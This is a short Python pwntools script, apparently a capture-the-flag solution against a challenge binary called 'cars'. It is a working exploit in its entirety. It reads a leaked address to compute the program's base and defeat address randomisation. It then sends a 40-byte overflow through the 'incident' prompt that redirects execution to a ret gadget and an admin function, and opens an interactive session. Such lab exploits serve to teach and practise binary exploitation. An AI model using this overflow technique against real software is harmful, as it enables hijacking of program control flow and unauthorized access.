from pwn import *

# run the program
p = process("./cars")

p.recvuntil(b"Report number: #")
REPORT_NUMBER_ADDRESS = int(p.recvline())
ELF_BASE = REPORT_NUMBER_ADDRESS - 0x4090
ADDRESS_OF_ADMIN = ELF_BASE + 0x128E
RET_GADGET = ELF_BASE + 0x101A

# Please input your Student ID:
p.sendline(b"id")

# Please describe the incident: (vulnerable!!)
payload = b"A"*40  # pad our return address
payload += p64(RET_GADGET)
payload += p64(ADDRESS_OF_ADMIN)
p.sendline(payload)

p.interactive()

